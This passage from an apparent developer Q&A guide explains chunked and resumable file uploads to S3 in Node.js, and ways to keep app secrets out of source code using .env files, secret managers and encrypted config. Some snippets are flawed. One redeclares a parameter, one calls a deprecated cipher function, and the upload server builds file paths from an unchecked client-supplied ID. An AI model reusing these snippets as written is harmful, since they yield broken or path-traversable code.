- ❌ If interrupted, must restart from 0

### Solution: Chunked Upload

Split large file into **small chunks**, upload them **separately**, reassemble on server or stream to cloud.

### Implementation

#### Frontend (React/HTML)

```javascript
// client.js
async function uploadLargeFile(file) {
  const chunkSize = 5 * 1024 * 1024; // 5MB chunks
  const totalChunks = Math.ceil(file.size / chunkSize);
  const uploadId = generateUUID(); // unique ID for this upload

  for (let i = 0; i < totalChunks; i++) {
    const start = i * chunkSize;
    const end = Math.min(start + chunkSize, file.size);
    const chunk = file.slice(start, end);

    const formData = new FormData();
    formData.append('chunk', chunk);
    formData.append('uploadId', uploadId);
    formData.append('chunkIndex', i);
    formData.append('totalChunks', totalChunks);

    // Upload this chunk
    const response = await fetch('/upload-chunk', {
      method: 'POST',
      body: formData
    });

    if (!response.ok) {
      console.error(`Chunk ${i} failed`);
      return;
    }

    // Progress update
    console.log(`Uploaded ${i + 1}/${totalChunks}`);
  }

  // All chunks uploaded, notify server to finalize
  const finalResponse = await fetch('/upload-complete', {
    method: 'POST',
    body: JSON.stringify({ uploadId })
  });

  console.log('Upload complete!');
}

// Usage
document.getElementById('fileInput').addEventListener('change', (e) => {
  uploadLargeFile(e.target.files[0]);
});
```

#### Backend (Node.js)

```javascript
const express = require('express');
const multer = require('multer');
const fs = require('fs');
const AWS = require('aws-sdk');

const app = express();
const upload = multer({ dest: 'uploads/' });
const s3 = new AWS.S3();

// Store metadata about uploads in progress
const uploads = {};

// Handle chunk upload
app.post('/upload-chunk', upload.single('chunk'), (req, res) => {
  const { uploadId, chunkIndex, totalChunks } = req.body;
  
  // Initialize upload if first chunk
  if (!uploads[uploadId]) {
    uploads[uploadId] = {
      chunks: [],
      totalChunks: parseInt(totalChunks),
      startTime: Date.now()
    };
  }

  // Store chunk file path
  uploads[uploadId].chunks[chunkIndex] = req.file.path;

  res.json({ 
    message: `Chunk ${chunkIndex} received`,
    progress: `${Object.keys(uploads[uploadId].chunks).length}/${totalChunks}`
  });
});

// Finalize upload and send to S3
app.post('/upload-complete', express.json(), async (req, res) => {
  const { uploadId } = req.body;
  const uploadMeta = uploads[uploadId];

  if (!uploadMeta) {
    return res.status(404).json({ error: 'Upload not found' });
  }

  // Combine all chunks
  const outputPath = `final-uploads/${uploadId}.mp4`;
  const writeStream = fs.createWriteStream(outputPath);

  for (let i = 0; i < uploadMeta.totalChunks; i++) {
    const chunkPath = uploadMeta.chunks[i];
    const data = fs.readFileSync(chunkPath);
    writeStream.write(data);
    fs.unlinkSync(chunkPath); // delete chunk file
  }

  writeStream.end();

  // Upload final file to S3
  writeStream.on('finish', async () => {
    const fileStream = fs.createReadStream(outputPath);
    
    const s3Params = {
      Bucket: 'my-bucket',
      Key: `videos/${uploadId}.mp4`,
      Body: fileStream
    };

    s3.upload(s3Params, (err, data) => {
      if (err) {
        return res.status(500).json({ error: 'S3 upload failed' });
      }

      // Clean up local file
      fs.unlinkSync(outputPath);
      delete uploads[uploadId];

      res.json({ 
        success: true, 
        s3Url: data.Location,
        duration: Date.now() - uploadMeta.startTime
      });
    });
  });
});

app.listen(3000);
```

### Alternative: Stream Directly to S3

Even better — don't save to disk, stream chunks **directly to S3**:

```javascript
const AWS = require('aws-sdk');
const s3 = new AWS.S3();

app.post('/upload-chunk-to-s3', upload.single('chunk'), async (req, res) => {
  const { uploadId, chunkIndex } = req.body;

  // Upload chunk directly to S3 using multipart upload
  // (simplified version)
  const s3Params = {
    Bucket: 'my-bucket',
    Key: `uploads/${uploadId}/chunk-${chunkIndex}`,
    Body: fs.createReadStream(req.file.path)
  };

  s3.upload(s3Params, (err, data) => {
    fs.unlinkSync(req.file.path); // delete local chunk
    if (err) return res.status(500).json({ error: err });
    res.json({ success: true });
  });
});
```

### Multi-part Upload (AWS SDK)

```javascript
const AWS = require('aws-sdk');
const s3 = new AWS.S3();

async function uploadWithMultipart(file) {
  const params = {
    Bucket: 'my-bucket',
    Key: file.name,
    Body: file
  };

  // S3 automatically handles chunking
  const result = await s3.upload(params, {
    partSize: 5 * 1024 * 1024 // 5MB parts
  }).promise();

  return result.Location;
}
```

### Frontend Progress with Resumable Uploads

```javascript
// Store upload progress to localStorage
function saveUploadProgress(uploadId, chunkIndex) {
  const progress = JSON.parse(localStorage.getItem('uploads') || '{}');
  progress[uploadId] = chunkIndex;
  localStorage.setItem('uploads', JSON.stringify(progress));
}

// Resume from where we left off
async function resumeUpload(uploadId, file) {
  const lastChunk = JSON.parse(localStorage.getItem('uploads') || '{}')[uploadId] || 0;
  
  // Start from lastChunk + 1
  for (let i = lastChunk + 1; i < totalChunks; i++) {
    // upload chunk
  }
}
```

---

## 51. How can we store sensitive keys inside our app?

### The Problem

**Never hardcode secrets in code:**

```javascript
// ❌ DANGEROUS — in version control for everyone to see
const dbPassword = 'super-secret-password-123';
const apiKey = 'sk-1234567890abcdef';
const jwtSecret = 'my-jwt-secret';
```

If someone gets access to your repo, all secrets are compromised.

### Solution 1: Environment Variables (`.env` file)

```bash
# .env file (NOT committed to Git)
DB_PASSWORD=super-secret-password-123
API_KEY=sk-1234567890abcdef
JWT_SECRET=my-jwt-secret
NODE_ENV=production
```

```javascript
// .gitignore (prevent .env from being committed)
.env
.env.local
.env.*.local
```

```javascript
// app.js
require('dotenv').config(); // load .env variables

const dbPassword = process.env.DB_PASSWORD;
const apiKey = process.env.API_KEY;
const jwtSecret = process.env.JWT_SECRET;

console.log(dbPassword); // 'super-secret-password-123'
```

**Pros**: Simple, works for development

**Cons**: .env file still on server (if breached, everything compromised)

### Solution 2: Secrets Manager (Production)

For production, use cloud providers' **secrets management services**:

#### AWS Secrets Manager

```javascript
const AWS = require('aws-sdk');
const secretsManager = new AWS.SecretsManager({ region: 'us-east-1' });

async function getSecret(secretName) {
  try {
    const data = await secretsManager.getSecretValue({ SecretId: secretName }).promise();
    return JSON.parse(data.SecretString);
  } catch (error) {
    console.error('Failed to get secret:', error);
  }
}

// Usage
const dbCreds = await getSecret('prod/db-credentials');
const mongoUri = `mongodb://${dbCreds.username}:${dbCreds.password}@...`;
```

#### Google Cloud Secret Manager

```javascript
const { SecretManagerServiceClient } = require('@google-cloud/secret-manager');

async function getSecret(projectId, secretId, version = 'latest') {
  const client = new SecretManagerServiceClient();
  const name = client.secretVersionPath(projectId, secretId, version);
  const [version] = await client.accessSecretVersion({ name });
  return version.payload.data.toString();
}

const apiKey = await getSecret('my-project', 'api-key');
```

#### Azure Key Vault

```javascript
const { SecretClient } = require('@azure/keyvault-secrets');
const { DefaultAzureCredential } = require('@azure/identity');

const credential = new DefaultAzureCredential();
const client = new SecretClient(`https://<vault-name>.vault.azure.net`, credential);

const secret = await client.getSecret('api-key');
console.log(secret.value);
```

### Solution 3: HashiCorp Vault

```javascript
const vault = require('node-vault')();

async function getSecret(path) {
  const result = await vault.read(path);
  return result.data;
}

const dbPassword = await getSecret('secret/data/db');
```

### Solution 4: Encrypted Configuration Files

For complex configurations, encrypt and commit a config file:

```bash
# config.encrypted.json → committed to git
# config.json → local only, created from decrypted file
```

```javascript
const crypto = require('crypto');
const fs = require('fs');

function decryptConfig() {
  const encryptionKey = process.env.CONFIG_ENCRYPTION_KEY;
  const encrypted = fs.readFileSync('config.encrypted.json');
  const decipher = crypto.createDecipher('aes-256-cbc', encryptionKey);
  
  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  
  return JSON.parse(decrypted);
}

const config = decryptConfig();
```

### Best Practices Checklist

```
☑️ Never commit .env files
☑️ Add .env to .gitignore immediately
☑️ Use `require('dotenv').config()` in development
☑️ Use cloud Secrets Manager in production
☑️ Rotate secrets regularly
☑️ Use different keys for dev/staging/prod
☑️ Limit access to secrets (principle of least privilege)
☑️ Audit who accesses secrets
☑️ Never log secrets
☑️ Use HTTPS for all secret transmission
☑️ Consider secret expiration
```

### Sample .env Setup

```bash
# .env.example (template, safe to commit)
DATABASE_URL=mongodb://user:pass@localhost
API_KEY=your-api-key-here
JWT_SECRET=your-jwt-secret-here
NODE_ENV=development

# .env (actual values, in .gitignore)
DATABASE_URL=mongodb://actual-user:actual-pass@actual-host
API_KEY=sk-1234567890abcdef
JWT_SECRET=super-secret-value
NODE_ENV=development
```

```javascript
// app.js
require('dotenv').config();

const mongoUri = process.env.DATABASE_URL;
const apiKey = process.env.API_KEY;
const jwtSecret = process.env.JWT_SECRET;

if (!mongoUri || !apiKey || !jwtSecret) {
  throw new Error('Missing required environment variables');
}

module.exports = { mongoUri, apiKey, jwtSecret };
```

---

*End of Document — Questions 41 to 51*
